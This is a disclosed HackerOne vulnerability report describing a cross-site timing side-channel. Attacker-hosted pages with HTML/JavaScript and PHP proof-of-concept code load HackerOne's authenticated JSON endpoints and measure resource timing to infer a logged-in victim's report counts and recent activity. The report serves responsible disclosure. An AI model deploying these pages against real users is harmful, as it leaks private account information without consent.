# Timing attack towards endpoints on the web without CSRF 

## Report Details
- **Report ID**: 348168
- **URL**: https://hackerone.com/reports/348168
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-05-07T12:54:56.556Z
- **Disclosed**: 2018-12-27T12:27:09.459Z

## Reporter
- **Username**: b258ea62bf297b02afa9854
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**
When logged in user on HackerOne visits another web page, remote web page could get conclusion regarding this data:
- logged in user
- number of triaged reports in the ~last month
- number of new reports at the moment
- number of closed reports
...

This conclusions are only from one endpoint https://hackerone.com/bugs.json?text_query=999999&subject=&sort_type=pg_search_rank&substates%5B%5D=triaged .
Every endpoint that lists data without CSRF token, but holds interesting conclusion like ( does one program have triaged reports atm )

**Description:**
Yesterday I got this idea regarding getting conclusions from web endpoints that aren't protected by CSRF tokens. During the research I have employed the https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API . From the API we can read the load time for certain resource and having few another conditions enabled on some web api / endpoints we can get valuable conclusions. Check the following snippet:
```
<html>
<head>
<script>
function calculate_load_times() {
  // Check performance support
  if (performance === undefined) {
    console.log("= Calculate Load Times: performance NOT supported");
    return;
  }

  // Get a list of "resource" performance entries
  var resources = performance.getEntriesByType("resource");
  if (resources === undefined || resources.length <= 0) {
    console.log("= Calculate Load Times: there are NO `resource` performance records");
    return;
  }

  console.log("= Calculate Load Times");
  for (var i=0; i < resources.length; i++) {
    // Response time
    t = resources[i].responseEnd - resources[i].responseStart;
    console.log(t);
 }
}
</script>
</head>
<body>
<img id="grr" src="https://hackerone.com/bugs.json?text_query=3%08&subject=%01&sort_type=upvotes&substates%5B%5D=spam">
</body>
</html>
```

1. Host it on "attacker" domain
2. If you are logged in on HackerOne and you visit attacker domain the script will work e.g. 200 response code will cause the script to measure the load time, if not load time won't be shown ( http 400, 500 status codes)
3. Find interesting endpoints that could deliver conclusions or static data that could help in future.

Detailed description:

At the moment will deliver always constant output for any logged in user ~750b: https://hackerone.com/bugs.json?text_query=999999&subject=&sort_type=pg_search_rank&substates%5B%5D=triaged  

This one too ~9200b : https://hackerone.com/programs/search.json?query=IBB&sort=published_at%3Adescending&page=1

This means we as logged in users could measure the average size in bytes from those two responses and this values are almost the same for any logged in user on HackerOne.

Now when victim ( logged in on HackerOne ) visits the "attacker" web site, the attacker web site could measure the time needed for many calls towards this endpoints => we can get idea regarding the internet speed of victim e.g.

Measure average page load for search.json with this script 1.php ( host it, visit it logged on H1 and type `calculate_load_times()` in browser console )
```
<html>
<head>
<script>
function calculate_load_times() {
  // Check performance support
  if (performance === undefined) {
    console.log("= Calculate Load Times: performance NOT supported");
    return;
  }

  // Get a list of "resource" performance entries
  var resources = performance.getEntriesByType("resource");
  if (resources === undefined || resources.length <= 0) {
    console.log("= Calculate Load Times: there are NO `resource` performance records");
    return;
  }

  console.log("= Calculate Load Times");
  for (var i=0; i < resources.length; i++) {
    // Response time
    t = resources[i].responseEnd - resources[i].responseStart;
    console.log(t);
  }
}
</script>
</head>
<!-- https://hackerone.com/programs/search?query=test&sort=published_at%3Adescending&page=1 -->
<body>
<?php
for ($i=0;$i<30;$i++){
echo '<img id=grr"'.$i.'" src="https://hackerone.com/programs/search.json?query=IBB&sort=published_at%3Adescending&page=1&rnd='.rand(1,5000).'">
';
}
?>
</body>
</html>
```
Same for bugs.json with following 2.php (host it, visit it logged on H1 and type `calculate_load_times()` in browser console )
```
<html>
<head>
<script>
function calculate_load_times() {
  // Check performance support
  if (performance === undefined) {
    console.log("= Calculate Load Times: performance NOT supported");
    return;
  }

  // Get a list of "resource" performance entries
  var resources = performance.getEntriesByType("resource");
  if (resources === undefined || resources.length <= 0) {
    console.log("= Calculate Load Times: there are NO `resource` performance records");
    return;
  }

  console.log("= Calculate Load Times");
  for (var i=0; i < resources.length; i++) {
    

    // Response time
    t = resources[i].responseEnd - resources[i].responseStart;
    console.log(t);

    
  }
}
</script>
</head>
<!-- https://hackerone.com/programs/search?query=test&sort=published_at%3Adescending&page=1 -->
<body>
<?php
for ($i=0;$i<30;$i++){
echo '<img id=grr"'.$i.'" src="https://hackerone.com/bugs.json?text_query=999999&subject=&sort_type=pg_search_rank&substates%5B%5D=triaged&rnd='.rand(1,5000).'">';
}
?>
</body>
</html>
```
Now having this values about the load time we can simple calculate the average time for loading for each of the `img` elements => we can calculate approximately the internet speed of the victim towards HackerOne endpoints at that moment. Having the approximate internet speed and chance for measuring time needed for load of some interesting resource we can learn from this side channel attack if victim have created report in the last few days: https://hackerone.com/bugs.json?text_query=3480&subject=&sort_type=pg_search_rank&substates%5B%5D=new
or
https://hackerone.com/bugs.json?text_query=3479&subject=&sort_type=pg_search_rank&substates%5B%5D=new
...
Using the same scripts from above with specified urls. In this last urls exploiting fact is the guessing the time of the report based on report id.
From measured time, we can get conclusion even for the number of reports / records in the response if we divide the content size with average size of one (json) record. :)

As extra, this kind of attacks could be performed against H1 programs in order to get knowledge if some program have triaged reports, new, closed, ...  

I have performed PoC calculations based on 30 requests per endpoint from my localhost and works like a charm :)

### Optional: Your Environment (Browser version, Device, etc)

 * any modern browser

### Optional: Supporting Material/References (Screenshots)

 * https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API/Using_the_Resource_Timing_API

## Impact

Any endpoint on the net is vulnerable on this type of attack due the fact it is side channel attack which could be prevented only if CSRF tokens are supplied in the request as variables. This way, using this attack approach could be ex filtrated /learned many many information from visiting users who are logged in on services that host sensitive data regarding them. I'll continue with this research

## Attachments
No attachments
